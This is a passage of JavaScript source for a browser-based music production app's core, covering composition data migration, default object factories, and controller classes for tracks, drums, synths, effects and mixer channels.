	// loopA/B
	// ..........................................
	if ( Number.isFinite( cmp.loopA ) && Number.isFinite( cmp.loopB ) ) {
		cmp.loopA = Math.max( 0, cmp.loopA );
		cmp.loopB = Math.max( 0, cmp.loopB );
		if ( cmp.loopA === cmp.loopB ) {
			cmp.loopA =
			cmp.loopB = null;
		}
	} else {
		cmp.loopA =
		cmp.loopB = null;
	}

	// ***Opened
	// ..........................................
	cmp.synthOpened = cmp.synthOpened ? `${ cmp.synthOpened }` : null;
	cmp.patternKeysOpened = cmp.patternKeysOpened ? `${ cmp.patternKeysOpened }` : null;
	cmp.patternBufferOpened = cmp.patternBufferOpened ? `${ cmp.patternBufferOpened }` : null;
	delete cmp.patternOpened;

	// buffers
	// ..........................................
	cmp.buffers = cmp.buffers || {};

	// drumrows
	// ..........................................
	cmp.drumrows = cmp.drumrows || {};
	Object.values( cmp.drumrows ).forEach( row => {
		row.toggle = row.toggle !== false;
		row.detune = row.detune ?? 0;
	} );

	// drums
	// ..........................................
	cmp.drums = cmp.drums || {};
	Object.values( cmp.drums ).forEach( drums => {
		Object.values( drums ).forEach( drum => {
			if ( "gain" in drum ) {
				drum.pan = drum.pan ?? 0;
				drum.detune = drum.detune ?? 0;
			}
		} );
	} );

	// channels
	// ..........................................
	if ( !cmp.channels ) {
		cmp.channels = DAWCore.json.channels();
		Object.values( cmp.synths ).forEach( syn => syn.dest = "main" );
	}
	if ( ( !cmp.savedAt || cmp.savedAt < 1574550000 ) && cmp.channels.main.gain > .8 ) { // Sun Nov 24 2019 00:00:00 GMT+0100
		cmp.channels.main.gain = .4;
	}
	delete cmp.channels.main.order;

	// effects
	// ..........................................
	cmp.effects = cmp.effects || {};

	// patterns
	// ..........................................
	Object.values( cmp.patterns ).forEach( pat => {
		if ( !( "order" in pat ) ) {
			pat.order = orderDefault;
		}
		orderDefault = Math.max( pat.order, orderDefault ) + 1;
		if ( pat.type === "keys" ) {
			pat.synth = pat.synth || "0";
		}
	} );

	// synths
	// ..........................................
	if ( !cmp.synths ) {
		cmp.synths = { 0: DAWCore.json.synth() };
	}
	Object.values( cmp.synths ).forEach( syn => {
		delete syn.envelopes;
		syn.env = syn.env || DAWCore.json.env();
		syn.lfo = syn.lfo || DAWCore.json.lfo();
		Object.values( syn.oscillators ).forEach( osc => {
			osc.detune = Math.min( Math.max( -24, Math.round( osc.detune ) ), 24 );
		} );
	} );

	// ..........................................
	Object.values( cmp.tracks ).reduce( ( order, tr ) => {
		tr.name = typeof tr.name === "string" ? tr.name : "";
		tr.order = typeof tr.order === "number" ? tr.order : order;
		tr.toggle = typeof tr.toggle === "boolean" ? tr.toggle : true;
		return tr.order + 1;
	}, 0 );
	blcsValues.sort( ( a, b ) => a.when - b.when );
	cmp.blocks = blcsValues.reduce( ( obj, blc, i ) => {
		blc.offset = blc.offset || 0;
		blc.selected = !!blc.selected;
		blc.durationEdited = !!blc.durationEdited;
		obj[ i ] = blc;
		return obj;
	}, {} );
	Object.values( cmp.keys ).forEach( keys => {
		Object.values( keys ).forEach( k => {
			k.pan = GSUtils.castToNumber( k.pan, 0, -1, 1, 2 );
			k.gain = GSUtils.castToNumber( k.gain, .8, 0, 1, 2 );
			k.attack = GSUtils.castToNumber( k.attack, 0, 0, Infinity, 3 );
			k.release = GSUtils.castToNumber( k.release, 0, 0, Infinity, 3 );
			k.lowpass = GSUtils.castToNumber( k.lowpass, 1, 0, 1, 2 );
			k.highpass = GSUtils.castToNumber( k.highpass, 1, 0, 1, 2 );
			k.selected = !!k.selected;
			if ( typeof k.prev === "number" ) { k.prev += ""; }
			if ( typeof k.next === "number" ) { k.next += ""; }
			k.prev = k.prev || null;
			k.next = k.next || null;
			delete k.durationEdited;
			if ( typeof k.key === "string" ) {
				if ( window.gsuiKeys ) {
					k.key = window.gsuiKeys.keyStrToMidi( k.key );
				} else {
					console.warn( "DAWCore.Composition.format: gsuiKeys is needed to convert an old midi notation" );
					return null;
				}
			}
		} );
	} );
	return cmp;
};

DAWCore.Composition.prototype.change = function( obj, prevObj ) {
	const cmp = this.cmp,
		act = this.daw.history.getCurrentAction(),
		saved = act === this._actionSavedOn && !!cmp.savedAt;

	GSUtils.diffAssign( cmp, obj );
	this._wamixer.change( obj );
	this.daw._wadrumrows.change( obj );
	this._waeffects.change( obj );
	this.change.fn.forEach( ( fn, attr ) => {
		if ( typeof attr === "string" ) {
			if ( attr in obj ) {
				fn.call( this, obj, prevObj );
			}
		} else if ( attr.some( attr => attr in obj ) ) {
			fn.call( this, obj, prevObj );
		}
	} );

	if ( saved !== this._saved ) {
		this._saved = saved;
		this.daw._call( "compositionSavedStatus", cmp, saved );
	}
	this.daw._call( "compositionChanged", obj, prevObj );
	return obj;
};

DAWCore.Composition.prototype.change.fn = new Map( [
	[ "bpm", function( { bpm } ) {
		this._sched.setBPM( bpm );
		this._synths.forEach( syn => syn.setBPM( bpm ) );
		this.daw.drums.setBPM( bpm );
		this.daw.pianoroll.setBPM( bpm );
	} ],
	[ "blocks", function( { blocks } ) {
		this._sched.change( blocks );
	} ],
	[ [ "loopA", "loopB" ], function() {
		if ( this.daw.getFocusedObject() === this ) {
			this._sched.setLoopBeat(
				this.cmp.loopA || 0,
				this.cmp.loopB || this.cmp.duration || this.cmp.beatsPerMeasure );
		}
	} ],
	[ "duration", function() {
		if ( this.daw.getFocusedObject() === this && this.cmp.loopA === null ) {
			this._sched.setLoopBeat( 0, this.cmp.duration || this.cmp.beatsPerMeasure );
		}
	} ],
	[ "synths", function( { synths }, { synths: prevSynths } ) {
		Object.entries( synths ).forEach( ( [ id, synthObj ] ) => {
			if ( !synthObj ) {
				this._synths.get( id ).stopAllKeys();
				this._synths.delete( id );
			} else if ( !prevSynths[ id ] ) {
				const syn = new gswaSynth();

				syn.setContext( this.ctx );
				syn.setBPM( this.cmp.bpm );
				syn.change( synthObj );
				syn.output.connect( this._wamixer.getChanInput( synthObj.dest ) );
				this._synths.set( id, syn );
			} else {
				const syn = this._synths.get( id );

				if ( "oscillators" in synthObj || "lfo" in synthObj ) {
					syn.change( synthObj );
				}
				if ( "dest" in synthObj ) {
					syn.output.disconnect();
					syn.output.connect( this._wamixer.getChanInput( synthObj.dest ) );
				}
			}
		} );
	} ],
	[ "patterns", function( { patterns } ) {
		Object.entries( patterns ).forEach( ( [ patId, patObj ] ) => {
			if ( patObj ) {
				if ( "dest" in patObj && this.cmp.patterns[ patId ].type === "buffer" ) {
					this.redirectPatternBuffer( patId, patObj.dest );
				}
				if ( patId === this.cmp.patternKeysOpened ) {
					this.daw.pianoroll.change( patObj );
				} else if ( patId === this.cmp.patternDrumsOpened ) {
					this.daw.drums.change( patObj );
				}
			}
		} );
	} ],
	[ "keys", function( { keys, patterns } ) {
		const pats = Object.entries( this.cmp.patterns ),
			patOpened = this.cmp.patternKeysOpened;

		Object.entries( keys ).forEach( ( [ keysId, keysObj ] ) => {
			pats.some( ( [ patId, patObj ] ) => {
				if ( patObj.keys === keysId ) {
					this.assignPatternChange( patId, keysObj );
					if ( patId === patOpened ) {
						this.daw.pianoroll.change( patterns && patterns[ patId ], keysObj );
					}
					return true;
				}
			} );
		} );
	} ],
	[ "drums", function( { drums, patterns } ) {
		const pats = Object.entries( this.cmp.patterns ),
			patOpened = this.cmp.patternDrumsOpened;

		Object.entries( drums ).forEach( ( [ drumsId, drumsObj ] ) => {
			pats.some( ( [ patId, patObj ] ) => {
				if ( patObj.drums === drumsId ) {
					this.assignPatternChange( patId, drumsObj );
					if ( patId === patOpened ) {
						this.daw.drums.change( patterns && patterns[ patId ], drumsObj );
					}
					return true;
				}
			} );
		} );
	} ],
	[ "patternKeysOpened", function( obj ) {
		this.daw.pianoroll.openPattern( obj.patternKeysOpened );
	} ],
	[ "patternDrumsOpened", function( obj ) {
		this.daw.drums.openPattern( obj.patternDrumsOpened );
	} ],
	[ "synthOpened", function( obj ) {
		this.daw.pianoroll.setSynth( obj.synthOpened );
	} ],
] );

DAWCore.json.composition = ( env, id ) => {
	const tracks = {},
		sPB = env.def_stepsPerBeat,
		bPM = env.def_beatsPerMeasure;

	for ( let i = 0; i < env.def_nbTracks; ++i ) {
		tracks[ i ] = DAWCore.json.track( { order: i } );
	}
	return {
		id,
		name: "",
		bpm: env.def_bpm,
		stepsPerBeat: sPB,
		beatsPerMeasure: bPM,
		duration: bPM,
		loopA: false,
		loopB: false,
		synthOpened: "0",
		patternKeysOpened: "0",
		patternDrumsOpened: "1",
		patternBufferOpened: null,
		buffers: {
			0: { type: "audio/wav", duration: .1529, url: "kick-00.wav" },
			1: { type: "audio/wav", duration: .256, url: "clap-00.wav" },
			2: { type: "audio/wav", duration: .0357, url: "hat-00.wav" },
			3: { type: "audio/wav", duration: .1151, url: "snare-00.wav" },
			4: { type: "audio/wav", duration: .7, url: "hat-open-00.wav" },
		},
		patterns: {
			0: { order: 0, type: "keys", name: "keys", keys: "0", synth: "0", duration: bPM, },
			1: { order: 0, type: "drums", name: "drums", drums: "0", duration: bPM, },
			2: { order: 0, type: "buffer", dest: "1", buffer: "0", duration: 1, name: "kick" },
			3: { order: 1, type: "buffer", dest: "1", buffer: "1", duration: 1, name: "clap" },
			4: { order: 2, type: "buffer", dest: "1", buffer: "2", duration: 1, name: "hat" },
			6: { order: 3, type: "buffer", dest: "1", buffer: "4", duration: 1, name: "open hat" },
			5: { order: 4, type: "buffer", dest: "1", buffer: "3", duration: 1, name: "snare" },
		},
		channels: DAWCore.json.channels(),
		tracks,
		blocks: {
			0: DAWCore.json.block( { pattern: "0", track: "0", duration: bPM } ),
			1: DAWCore.json.block( { pattern: "1", track: "1", duration: bPM } ),
		},
		synths: { 0: DAWCore.json.synth( { dest: "2" } ) },
		drumrows: {
			0: DAWCore.json.drumrow( { order: 0, pattern: "2" } ),
			1: DAWCore.json.drumrow( { order: 1, pattern: "3" } ),
			2: DAWCore.json.drumrow( { order: 2, pattern: "4" } ),
			4: DAWCore.json.drumrow( { order: 3, pattern: "6" } ),
			3: DAWCore.json.drumrow( { order: 4, pattern: "5" } ),
		},
		drums: { 0: {} },
		keys: { 0: {} },
	};
};

DAWCore.json.block = obj => ( {
	pattern: null,
	duration: 0,
	durationEdited: false,
	selected: false,
	offset: 0,
	when: 0,
	track: null,
	...obj,
} );

DAWCore.json.channel = obj => ( {
	order: 0,
	toggle: true,
	name: "chan",
	dest: "main",
	gain: 1,
	pan: 0,
	...obj,
} );

DAWCore.json.channels = () => {
	const main = DAWCore.json.channel( { name: "main", gain: .4 } );

	delete main.dest;
	delete main.order;
	return {
		main,
		1: DAWCore.json.channel( { order: 0, name: "drums" } ),
		2: DAWCore.json.channel( { order: 1, name: "synth" } ),
		3: DAWCore.json.channel( { order: 2, name: "chan 3" } ),
		4: DAWCore.json.channel( { order: 3, name: "chan 4" } ),
	};
};

DAWCore.json.drum = obj => ( {
	when: 0,
	row: null,
	detune: 0,
	gain: 1,
	pan: 0,
	...obj,
} );

DAWCore.json.drumcut = obj => ( {
	when: 0,
	row: null,
	...obj,
} );

DAWCore.json.drumrow = obj => ( {
	order: 0,
	toggle: true,
	pattern: null,
	detune: 0,
	gain: 1,
	pan: 0,
	...obj,
} );

DAWCore.json.effects.filter = obj => ( {
	type: "lowpass",
	Q: 5,
	gain: -20,
	detune: 0,
	frequency: 500,
	...obj,
} );

DAWCore.json.env = obj => ( {
	toggle: true,
	attack: .15,
	hold: .08,
	decay: .08,
	substain: .5,
	release: .25,
	...obj,
} );

DAWCore.json.key = obj => ( {
	key: 57,
	when: 1,
	duration: 1,
	gain: .8,
	pan: 0,
	highpass: 1,
	lowpass: 1,
	attack: 0,
	release: 0,
	selected: false,
	prev: null,
	next: null,
	...obj,
} );

DAWCore.json.lfo = obj => ( {
	toggle: false,
	type: "sine",
	delay: 0,
	attack: 1,
	speed: 1,
	amp: 1,
	...obj,
} );

DAWCore.json.oscillator = obj => ( {
	order: 0,
	type: "sine",
	pan: 0,
	gain: 1,
	detune: 0,
	...obj,
} );

DAWCore.json.synth = obj => ( {
	name: "synth",
	dest: "main",
	env: DAWCore.json.env(),
	lfo: DAWCore.json.lfo(),
	oscillators: {
		0: DAWCore.json.oscillator( { gain: .75 } ),
		1: DAWCore.json.oscillator( { order: 1, gain: .2, detune: -24 } ),
	},
	...obj,
} );

DAWCore.json.track = obj => ( {
	name: "",
	order: 0,
	toggle: true,
	...obj,
} );

DAWCore.controllers.blocks = class {
	constructor( fns ) {
		this.data = {};
		this.on = GSUtils.mapCallbacks( [
			"addBlock",
			"removeBlock",
			"changeBlockProp",
			"updateBlockViewBox",
		], fns.dataCallbacks );
		this._blocksCrud = GSUtils.createUpdateDelete.bind( null, this.data,
			this._addBlock.bind( this ),
			this._updateBlock.bind( this ),
			this._deleteBlock.bind( this ) );
		Object.freeze( this );
	}

	// .........................................................................
	clear() {
		Object.keys( this.data ).forEach( this._deleteBlock, this );
	}
	change( obj ) {
		this._blocksCrud( obj.blocks );
	}

	// .........................................................................
	_addBlock( id, obj ) {
		const blc = { ...obj };

		this.data[ id ] = blc;
		this.on.addBlock( id, blc );
		this._updateBlock( id, blc );
	}
	_deleteBlock( id ) {
		delete this.data[ id ];
		this.on.removeBlock( id );
	}
	_updateBlock( id, obj ) {
		const dataBlc = this.data[ id ],
			cb = this.on.changeBlockProp.bind( null, id );

		this._setProp( dataBlc, cb, "when", obj.when );
		this._setProp( dataBlc, cb, "duration", obj.duration );
		this._setProp( dataBlc, cb, "offset", obj.offset );
		this._setProp( dataBlc, cb, "track", obj.track );
		this._setProp( dataBlc, cb, "selected", obj.selected );
		if ( "offset" in obj || "duration" in obj ) {
			this.on.updateBlockViewBox( id, dataBlc );
		}
	}
	_setProp( data, cb, prop, val ) {
		if ( val !== undefined ) {
			data[ prop ] = val;
			cb( prop, val );
		}
	}
};

Object.freeze( DAWCore.controllers.blocks );

DAWCore.controllers.drumrows = class {
	constructor( fns ) {
		this.data = Object.freeze( {
			patterns: {},
			drumrows: {},
		} );
		this.on = GSUtils.mapCallbacks( [
			"addDrumrow",
			"removeDrumrow",
			"changeDrumrow",
		], fns.dataCallbacks );
		this._drumrowsCrud = GSUtils.createUpdateDelete.bind( null, this.data.drumrows,
			this._addDrumrow.bind( this ),
			this._updateDrumrow.bind( this ),
			this._deleteDrumrow.bind( this ) );
		this._patternsCrud = GSUtils.createUpdateDelete.bind( null, this.data.patterns,
			this._addPattern.bind( this ),
			this._updatePattern.bind( this ),
			this._deletePattern.bind( this ) );
		Object.freeze( this );
	}
	change( { patterns, drumrows } ) {
		if ( patterns ) { this._patternsCrud( patterns ); }
		if ( drumrows ) { this._drumrowsCrud( drumrows ); }
	}
	clear() {
		Object.keys( this.data.patterns ).forEach( id => delete this.data.patterns[ id ] );
		Object.keys( this.data.drumrows ).forEach( this._deleteDrumrow, this );
	}

	// .........................................................................
	_addPattern( id, { type, name, dest, buffer, duration } ) {
		if ( type === "buffer" ) {
			const pat = Object.seal( { name, dest, buffer, duration } );

			this.data.patterns[ id ] = pat;
			this._updatePattern( id, pat );
		}
	}
	_updatePattern( id, { name, duration, dest } ) {
		if ( name !== undefined || duration !== undefined || dest !== undefined ) {
			const pat = this.data.patterns[ id ],
				rowsEnt = Object.entries( this.data.drumrows )
					.filter( kv => kv[ 1 ].pattern === id );

			this.__updatePattern( pat, rowsEnt, "name", name );
			this.__updatePattern( pat, rowsEnt, "dest", dest );
			this.__updatePattern( pat, rowsEnt, "duration", duration );
		}
	}
	__updatePattern( pat, rowsEnt, prop, val ) {
		if ( val !== undefined ) {
			pat[ prop ] = val;
			rowsEnt.forEach( kv => this.on.changeDrumrow( kv[ 0 ], prop, val ) );
		}
	}
	_deletePattern( id ) {
		delete this.data.patterns[ id ];
	}

	// .........................................................................
	_addDrumrow( id, obj ) {
		const row = Object.seal( { ...obj } );

		this.data.drumrows[ id ] = row;
		this.on.addDrumrow( id, row );
		this.__updateDrumrow( id, row );
	}
	_deleteDrumrow( id ) {
		delete this.data.drumrows[ id ];
		this.on.removeDrumrow( id );
	}
	_updateDrumrow( id, obj ) {
		const row = this.data.drumrows[ id ];

		Object.assign( row, obj );
		this.__updateDrumrow( id, obj );
	}
	__updateDrumrow( id, obj ) {
		const pat = this.data.patterns[ obj.pattern ];

		this.___updateDrumrow( id, "order", obj.order );
		this.___updateDrumrow( id, "toggle", obj.toggle );
		this.___updateDrumrow( id, "detune", obj.detune );
		this.___updateDrumrow( id, "pan", obj.pan );
		this.___updateDrumrow( id, "gain", obj.gain );
		this.___updateDrumrow( id, "pattern", obj.pattern );
		this.___updateDrumrow( id, "name", obj.pattern && pat.name );
		this.___updateDrumrow( id, "duration", obj.pattern && pat.duration );
	}
	___updateDrumrow( id, prop, val ) {
		if ( val !== undefined ) {
			this.on.changeDrumrow( id, prop, val );
		}
	}
};

Object.freeze( DAWCore.controllers.drumrows );

DAWCore.controllers.drums = class {
	constructor( fns ) {
		this.data = {};
		this.on = GSUtils.mapCallbacks( [
			"addDrum",
			"removeDrum",
			"changeDrum",
			"addDrumcut",
			"removeDrumcut",
		], fns.dataCallbacks );
		this._drumsCrud = GSUtils.createUpdateDelete.bind( null, this.data,
			this._addDrum.bind( this ),
			this._changeDrum.bind( this ),
			this._deleteDrum.bind( this ) );
		Object.freeze( this );
	}
	change( obj ) {
		this._drumsCrud( obj );
	}
	clear() {
		Object.keys( this.data ).forEach( this._deleteDrum, this );
	}

	// .........................................................................
	_addDrum( id, obj ) {
		const cpy = { ...obj };

		this.data[ id ] = cpy;
		if ( "gain" in cpy ) {
			this.on.addDrum( id, cpy );
			this._changeDrum( id, cpy );
		} else {
			this.on.addDrumcut( id, cpy );
		}
	}
	_deleteDrum( id ) {
		const fn = "gain" in this.data[ id ]
				? this.on.removeDrum
				: this.on.removeDrumcut;

		delete this.data[ id ];
		fn( id );
	}
	_changeDrum( id, obj ) {
		this._changeDrumProp( id, "detune", obj.detune );
		this._changeDrumProp( id, "gain", obj.gain );
		this._changeDrumProp( id, "pan", obj.pan );
	}
	_changeDrumProp( id, prop, val ) {
		if ( val !== undefined ) {
			this.data[ id ][ prop ] = val;
			this.on.changeDrum( id, prop, val );
		}
	}
};

Object.freeze( DAWCore.controllers.drums );

DAWCore.controllers.effects = class {
	constructor( fns ) {
		this.data = {};
		this.on = GSUtils.mapCallbacks( [
			"changeBPM",
			"addEffect",
			"removeEffect",
			"changeEffect",
			"connectEffectTo",
			"changeEffectData",
		], fns.dataCallbacks );
		this.values = Object.seal( {
			destFilter: null,
			resetting: false,
		} );
		this._effectsCrud = GSUtils.createUpdateDelete.bind( null, this.data,
			this._addEffect.bind( this ),
			this._updateEffect.bind( this ),
			this._deleteEffect.bind( this ) );
		Object.freeze( this );
	}

	// .........................................................................
	clear() {
		Object.keys( this.data ).forEach( id => this._deleteEffect( id ) );
	}
	reset() {
		const ent = Object.entries( this.data );

		this.values.resetting = true;
		ent.forEach( kv => this._deleteEffect( kv[ 0 ] ) );
		this.values.resetting = false;
		ent.forEach( kv => this._addEffect( kv[ 0 ], kv[ 1 ] ) );
	}
	change( obj ) {
		if ( obj.bpm ) {
			this.on.changeBPM( obj.bpm );
		}
		if ( obj.effects ) {
			this._effectsCrud( obj.effects );
		}
	}
	setDestFilter( dest ) {
		const old = this.values.destFilter;

		if ( dest !== old ) {
			this.values.destFilter = dest;
			Object.entries( this.data ).forEach( ( [ id, fx ] ) => {
				if ( fx.dest === old ) {
					this.__deleteEffect( id );
				} else if ( fx.dest === dest ) {
					this.__effectAdd( id, fx );
				}
			} );
		}
	}

	// .........................................................................
	_addEffect( id, obj, diffObj ) {
		const fx = Object.seal( GSUtils.jsonCopy( obj ) );

		this.data[ id ] = fx;
		if ( this._fxDestOk( fx ) ) {
			this.__effectAdd( id, fx, diffObj );
		}
	}
	__effectAdd( id, fx, diffObj ) {
		this.on.addEffect( id, fx );
		this.on.changeEffect( id, "toggle", fx.toggle );
		this.on.changeEffect( id, "order", fx.order );
		this.on.changeEffectData( id, fx.data );
		if ( !GSUtils.isNoop( this.on.connectEffectTo ) ) {
			const [ prevId, nextId ] = this._findSiblingFxIds( id, diffObj );

			this.on.connectEffectTo( fx.dest, id, nextId );
			this.on.connectEffectTo( fx.dest, prevId, id );
		}
	}
	_deleteEffect( id, diffObj ) {
		const fx = this.data[ id ];

		if ( this._fxDestOk( fx ) ) {
			this.__deleteEffect( id, diffObj );
		}
		delete this.data[ id ];
	}
	__deleteEffect( id, diffObj ) {
		if ( !this.values.resetting && !GSUtils.isNoop( this.on.connectEffectTo ) ) {
			const [ prevId, nextId ] = this._findSiblingFxIds( id, diffObj );

			this.on.connectEffectTo( this.data[ id ].dest, prevId, nextId );
		}
		this.on.removeEffect( id );
	}
	_updateEffect( id, fx, diffObj ) {
		const dataObj = this.data[ id ],
			destOk = this._fxDestOk( dataObj );

		if ( "toggle" in fx ) {
			dataObj.toggle = fx.toggle;
			if ( destOk ) {
				this.on.changeEffect( id, "toggle", fx.toggle );
			}
		}
		if ( "data" in fx ) {
			GSUtils.diffAssign( dataObj.data, fx.data );
			if ( destOk ) {
				this.on.changeEffectData( id, fx.data );
			}
		}
		if ( "order" in fx ) {
			if ( destOk && !GSUtils.isNoop( this.on.connectEffectTo ) ) {
				const [ prevId, nextId ] = this._findSiblingFxIds( id, diffObj );

				this.on.connectEffectTo( dataObj.dest, prevId, nextId );
			}
			dataObj.order = fx.order;
			if ( destOk ) {
				this.on.changeEffect( id, "order", fx.order );
				if ( !GSUtils.isNoop( this.on.connectEffectTo ) ) {
					const [ prevId, nextId ] = this._findSiblingFxIds( id, diffObj );

					this.on.connectEffectTo( dataObj.dest, prevId, id );
					this.on.connectEffectTo( dataObj.dest, id, nextId );
				}
			}
		}
	}

	// .........................................................................
	_fxDestOk( fx ) {
		return !this.values.destFilter || fx.dest === this.values.destFilter;
	}
	_findSiblingFxIds( id, diffObj = {} ) {
		const { dest, order } = this.data[ id ];
		let prevId = null,
			nextId = null,
			prevOrder = -Infinity,
			nextOrder = Infinity;

		Object.entries( this.data ).forEach( ( [ fxId, fx ] ) => {
			if ( fxId !== id && fx.dest === dest ) {
				const fxOrder = ( diffObj[ fxId ] || fx ).order;

				if ( prevOrder < fxOrder && fxOrder < order ) {
					prevId = fxId;
					prevOrder = fxOrder;
				}
				if ( order < fxOrder && fxOrder < nextOrder ) {
					nextId = fxId;
					nextOrder = fxOrder;
				}
			}
		} );
		return [ prevId, nextId ];
	}
};

Object.freeze( DAWCore.controllers.effects );

DAWCore.controllers.keys = class {
	constructor( fns ) {
		this.data = {};
		this.on = GSUtils.mapCallbacks( [
			"addKey",
			"removeKey",
			"changeKeyProp",
		], fns.dataCallbacks );
		this._keysCrud = GSUtils.createUpdateDelete.bind( null, this.data,
			this._addKey.bind( this ),
			this._updateKey.bind( this ),
			this._deleteKey.bind( this ) );
		Object.freeze( this );
	}

	// .........................................................................
	clear() {
		Object.keys( this.data ).forEach( this._deleteKey, this );
	}
	change( keysObj ) {
		this._keysCrud( keysObj );
	}

	// .........................................................................
	_addKey( id, obj ) {
		const key = { ...obj };

		this.data[ id ] = key;
		this.on.addKey( id, key );
		this._updateKey( id, key );
	}
	_deleteKey( id ) {
		delete this.data[ id ];
		this.on.removeKey( id );
	}
	_updateKey( id, obj ) {
		const dataKey = this.data[ id ],
			cb = this.on.changeKeyProp.bind( null, id );

		this._setProp( dataKey, cb, "key", obj.key );
		this._setProp( dataKey, cb, "when", obj.when );
		this._setProp( dataKey, cb, "duration", obj.duration );
		this._setProp( dataKey, cb, "attack", obj.attack );
		this._setProp( dataKey, cb, "release", obj.release );
		this._setProp( dataKey, cb, "gain", obj.gain );
		this._setProp( dataKey, cb, "pan", obj.pan );
		this._setProp( dataKey, cb, "lowpass", obj.lowpass );
		this._setProp( dataKey, cb, "highpass", obj.highpass );
		this._setProp( dataKey, cb, "selected", obj.selected );
		this._setProp( dataKey, cb, "prev", obj.prev );
		this._setProp( dataKey, cb, "next", obj.next );
	}
	_setProp( data, cb, prop, val ) {
		if ( val !== undefined ) {
			data[ prop ] = val;
			cb( prop, val );
		}
	}
};

Object.freeze( DAWCore.controllers.keys );

DAWCore.controllers.mixer = class {
	constructor( fns ) {
		this.data = Object.freeze( { channels: {} } );
		this.on = GSUtils.mapCallbacks( [
			"addChannel",
			"removeChannel",
			"toggleChannel",
			"renameChannel",
			"reorderChannel",
			"redirectChannel",
			"changePanChannel",
			"changeGainChannel",
		], fns.dataCallbacks );
		this._chansCrud = GSUtils.createUpdateDelete.bind( null, this.data.channels,
			this._addChannel.bind( this ),
			this._updateChannel.bind( this ),
			this._deleteChannel.bind( this ) );
		Object.freeze( this );
	}

	// .........................................................................
	clear() {
		Object.keys( this.data.channels ).forEach( id => {
			if ( id !== "main" ) {
				this._deleteChannel( id );
			}
		} );
	}
	recall() {
		const ent = Object.entries( this.data.channels );

		ent.forEach( kv => this._deleteChannel( kv[ 0 ] ) );
		ent.forEach( kv => this._addChannel( kv[ 0 ], kv[ 1 ] ) );
	}
	change( { channels } ) {
		this._chansCrud( channels );
	}

	// .........................................................................
	_addChannel( id, obj ) {
		this.data.channels[ id ] = {};
		this.on.addChannel( id, obj );
		this._updateChannel( id, obj );
	}
	_deleteChannel( id ) {
		delete this.data.channels[ id ];
		this.on.removeChannel( id );
	}
	_updateChannel( id, obj ) {
		Object.assign( this.data.channels[ id ], obj );
		this.__updateChannel( id, obj.name, this.on.renameChannel );
		this.__updateChannel( id, obj.order, this.on.reorderChannel );
		this.__updateChannel( id, obj.toggle, this.on.toggleChannel );
		this.__updateChannel( id, obj.dest, this.on.redirectChannel );
		this.__updateChannel( id, obj.pan, this.on.changePanChannel );
		this.__updateChannel( id, obj.gain, this.on.changeGainChannel );
	}
	__updateChannel( id, val, fn ) {
		if ( val !== undefined ) {
			fn( id, val );
		}
	}
};

Object.freeze( DAWCore.controllers.mixer );

DAWCore.controllers.synth = class {
	constructor( fns ) {
		this.data = Object.seal( {
			name: "",
			env: Object.seal( DAWCore.json.env() ),
			lfo: Object.seal( DAWCore.json.lfo() ),
			oscillators: {},
		} );
		this.on = GSUtils.mapCallbacks( [
			"addOsc",
			"removeOsc",
			"changeOsc",
			"changeOscProp",
			"updateOscWave",
			"changeLFO",
			"changeLFOProp",
			"updateLFOWave",
			"changeEnv",
			"changeEnvProp",
			"updateEnvWave",
		], fns.dataCallbacks );
		this._oscsCrud = GSUtils.createUpdateDelete.bind( null, this.data.oscillators,
			this._addOsc.bind( this ),
			this._updateOsc.bind( this ),
			this._deleteOsc.bind( this ) );
		Object.freeze( this );
	}

	// .........................................................................
	clear() {
		Object.keys( this.data.oscillators ).forEach( this._deleteOsc, this );
	}
	recall() {
		const oscs = Object.entries( this.data.oscillators );

		oscs.forEach( kv => this.on.removeOsc( kv[ 0 ] ) );
		oscs.forEach( kv => this.on.addOsc( kv[ 0 ], kv[ 1 ] ) );
	}
	change( obj ) {
		if ( "name" in obj ) {
			this.data.name = obj.name;
		}
		if ( obj.env ) {
			this._updateEnv( obj.env );
		}
		if ( obj.lfo ) {
			this._updateLFO( obj.lfo );
		}
		if ( obj.oscillators ) {
			this._oscsCrud( obj.oscillators );
		}
	}

	// .........................................................................
	_addOsc( id, obj ) {
		const osc = { ...obj };

		this.data.oscillators[ id ] = osc;
		this.on.addOsc( id, osc );
		this._updateOsc( id, osc );
	}
	_deleteOsc( id ) {
		delete this.data.oscillators[ id ];
		this.on.removeOsc( id );
	}
	_updateOsc( id, obj ) {
		const dataOsc = this.data.oscillators[ id ],
			cb = this.on.changeOscProp.bind( null, id );

		this._setProp( dataOsc, cb, "order", obj.order );
		this._setProp( dataOsc, cb, "type", obj.type );
		this._setProp( dataOsc, cb, "pan", obj.pan );
		this._setProp( dataOsc, cb, "gain", obj.gain );
		this._setProp( dataOsc, cb, "detune", obj.detune );
		this.on.updateOscWave( id );
		this.on.changeOsc( id, obj );
	}
	_updateEnv( obj ) {
		const dataEnv = this.data.env,
			cb = this.on.changeEnvProp;

		this._setProp( dataEnv, cb, "toggle", obj.toggle );
		this._setProp( dataEnv, cb, "attack", obj.attack );
		this._setProp( dataEnv, cb, "hold", obj.hold );
		this._setProp( dataEnv, cb, "decay", obj.decay );
		this._setProp( dataEnv, cb, "substain", obj.substain );
		this._setProp( dataEnv, cb, "release", obj.release );
		this.on.updateEnvWave();
		this.on.changeEnv( obj );
	}
	_updateLFO( obj ) {
		const dataLFO = this.data.lfo,
			cb = this.on.changeLFOProp;

		this._setProp( dataLFO, cb, "toggle", obj.toggle );
		this._setProp( dataLFO, cb, "type", obj.type );
		this._setProp( dataLFO, cb, "delay", obj.delay );
		this._setProp( dataLFO, cb, "attack", obj.attack );
		this._setProp( dataLFO, cb, "speed", obj.speed );
		this._setProp( dataLFO, cb, "amp", obj.amp );
		this.on.updateLFOWave();
		this.on.changeLFO( obj );
	}
	_setProp( data, cb, prop, val ) {
		if ( val !== undefined ) {
			data[ prop ] = val;
			cb( prop, val );
		}
	}
};

Object.freeze( DAWCore.controllers.synth );

DAWCore.controllers.tracks = class {
	constructor( fns ) {
		this.data = {};
		this.on = GSUtils.mapCallbacks( [
			"addTrack",
			"removeTrack",
			"toggleTrack",
			"renameTrack",
			"reorderTrack",
		], fns.dataCallbacks );
		this._tracksCrud = GSUtils.createUpdateDelete.bind( null, this.data,
			this._addTrack.bind( this ),
			this._changeTrack.bind( this ),
			this._deleteTrack.bind( this ) );
		Object.freeze( this );
	}
	change( obj ) {
		this._tracksCrud( obj.tracks );
	}
	clear() {
		Object.keys( this.data ).forEach( this._deleteTrack, this );
	}

	// .........................................................................
	_addTrack( id, obj ) {
		this.data[ id ] = { ...obj };
		this.on.addTrack( id );
		this._changeTrack( id, obj );
	}
	_deleteTrack( id ) {
		delete this.data[ id ];
